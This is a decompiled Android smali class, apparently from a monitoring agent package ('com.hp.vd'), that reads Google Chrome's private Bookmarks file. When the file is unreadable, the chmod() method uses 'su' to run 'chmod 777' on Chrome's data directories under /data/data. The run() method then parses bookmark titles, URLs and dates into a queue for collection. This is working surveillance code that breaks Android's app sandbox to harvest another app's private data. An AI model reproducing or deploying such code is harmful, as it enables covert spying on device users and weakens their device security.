.class public Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;
.super Ljava/lang/Object;
.source "BrowserBookmarkListerPostLollipop.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "BrowserBookmarkListerPostLollipop"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 3

    .line 243
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 244
    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 247
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 248
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod -R 777 "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 251
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod 777 "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 254
    :goto_0
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 256
    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 257
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    .line 259
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    .line 267
    iget-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "BrowserBookmarkListerPostLollipop"

    const-string v1, "chmod(): InterruptedException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    .line 264
    iget-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "BrowserBookmarkListerPostLollipop"

    const-string v1, "chmod(): IOException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method chromeTime(J)J
    .locals 4

    const-wide/16 v0, 0x3e8

    .line 230
    div-long/2addr p1, v0

    const-wide v0, 0xa9730b66800L

    sub-long v2, p1, v0

    return-wide v2
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 235
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 237
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected parseAndFeed(Lorg/json/JSONArray;Lcom/hp/vd/data/concurrency/BlockingQueue;II)I
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lorg/json/JSONArray;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;II)I"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lorg/json/JSONException;
        }
    .end annotation

    const/4 v0, 0x0

    .line 171
    :goto_0
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-ge v0, v1, :cond_3

    .line 172
    invoke-virtual {p1, v0}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v1

    .line 174
    instance-of v2, v1, Lorg/json/JSONObject;

    if-eqz v2, :cond_2

    .line 175
    check-cast v1, Lorg/json/JSONObject;

    const-string v2, "type"

    .line 177
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "url"

    .line 178
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v2, "children"

    .line 179
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    .line 181
    invoke-virtual {p0, v1, p2, p3, p4}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->parseAndFeed(Lorg/json/JSONArray;Lcom/hp/vd/data/concurrency/BlockingQueue;II)I

    move-result v1

    if-le v1, p4, :cond_2

    move p4, v1

    goto :goto_1

    :cond_0
    const-string v2, "id"

    .line 188
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v2

    if-gt v2, p3, :cond_1

    goto :goto_1

    :cond_1
    const-string p4, "name"

    .line 194
    invoke-virtual {v1, p4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    const-string v3, "url"

    .line 195
    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "date_added"

    .line 201
    invoke-virtual {v1, v4}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v4

    .line 202
    invoke-virtual {p0, v4, v5}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->chromeTime(J)J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 203
    new-instance v4, Ljava/util/Date;

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    invoke-direct {v4, v5, v6}, Ljava/util/Date;-><init>(J)V

    .line 209
    new-instance v1, Lcom/hp/vd/data/BrowserBookmarkData;

    invoke-direct {v1}, Lcom/hp/vd/data/BrowserBookmarkData;-><init>()V

    const/4 v5, 0x2

    .line 211
    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v1, Lcom/hp/vd/data/BrowserBookmarkData;->source:Ljava/lang/Integer;

    .line 212
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v1, Lcom/hp/vd/data/BrowserBookmarkData;->internalId:Ljava/lang/Integer;

    .line 213
    iput-object p4, v1, Lcom/hp/vd/data/BrowserBookmarkData;->title:Ljava/lang/String;

    .line 214
    iput-object v3, v1, Lcom/hp/vd/data/BrowserBookmarkData;->url:Ljava/lang/String;

    .line 215
    iput-object v4, v1, Lcom/hp/vd/data/BrowserBookmarkData;->createdAt:Ljava/util/Date;

    .line 217
    invoke-virtual {p2, v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    move p4, v2

    :cond_2
    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_3
    return p4
.end method

.method public run()V
    .locals 8

    const-string v0, "/data/data/com.android.chrome/app_chrome/Default/Bookmarks"

    const/4 v1, 0x4

    .line 66
    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "/data/data/com.android.chrome/"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "/data/data/com.android.chrome/app_chrome/"

    const/4 v4, 0x1

    aput-object v2, v1, v4

    const-string v2, "/data/data/com.android.chrome/app_chrome/Default/"

    const/4 v4, 0x2

    aput-object v2, v1, v4

    const/4 v2, 0x3

    aput-object v0, v1, v2

    .line 73
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->isReadable(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 74
    array-length v4, v1

    move v5, v3

    :goto_0
    if-ge v5, v4, :cond_1

    aget-object v6, v1, v5

    .line 75
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->isReadable(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 76
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {p0, v6, v7}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    :cond_0
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 85
    :cond_1
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 87
    invoke-virtual {v1}, Ljava/io/File;->isFile()Z

    move-result v0

    if-nez v0, :cond_2

    .line 88
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserBookmarkListerPostLollipop"

    const-string v3, "Bookmarks file is not a file."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 93
    :cond_2
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    .line 94
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserBookmarkListerPostLollipop"

    const-string v3, "Bookmarks file does not exist."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 99
    :cond_3
    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v0, v3, v5

    if-eqz v0, :cond_7

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/32 v5, 0x40000

    cmp-long v0, v3, v5

    if-lez v0, :cond_4

    goto/16 :goto_3

    .line 106
    :cond_4
    :try_start_0
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 107
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    const-string v3, "UTF-8"

    invoke-direct {v2, v0, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 108
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 111
    :goto_1
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_5

    .line 112
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 119
    :cond_5
    new-instance v1, Lorg/json/JSONObject;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "version"

    .line 121
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 122
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "BrowserBookmarkListerPostLollipop"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "version: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v0, "roots"

    .line 124
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "synced"

    .line 125
    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "children"

    .line 126
    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    .line 132
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_bookmark_id_chrome_root"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGetInt(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    .line 133
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "BrowserBookmarkListerPostLollipop"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): oldMaxId loaded: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 139
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {p0, v0, v2, v1, v1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->parseAndFeed(Lorg/json/JSONArray;Lcom/hp/vd/data/concurrency/BlockingQueue;II)I

    move-result v0

    .line 140
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "BrowserBookmarkListerPostLollipop"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): newMaxId after data extraction: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-le v0, v1, :cond_6

    .line 148
    :try_start_1
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_bookmark_id_chrome_root"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v2, v3, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 150
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    .line 151
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_0
    move-exception v0

    .line 155
    :try_start_2
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_bookmark_id_chrome_root"

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 157
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "BrowserBookmarkListerPostLollipop"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): could not commit max_bookmark_id_chrome_root, reverting to the old value = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v3, v1, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    .line 165
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserBookmarkListerPostLollipop"

    const-string v3, "Exception caught in run()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_6
    :goto_2
    return-void

    .line 100
    :cond_7
    :goto_3
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserBookmarkListerPostLollipop"

    const-string v3, "Bookmarks file is 0L long."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void
.end method
